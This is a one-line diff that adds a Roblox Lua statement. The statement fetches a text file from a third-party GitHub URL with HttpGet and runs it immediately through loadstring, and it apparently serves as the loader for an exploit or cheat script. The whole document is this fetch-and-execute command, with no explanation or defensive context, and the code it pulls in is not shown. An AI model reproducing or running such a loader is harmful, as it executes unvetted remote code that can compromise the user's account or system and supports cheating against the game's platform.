@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Alexisisback/Universall/main/Ping%20view%20new%20protect.txt", true))()
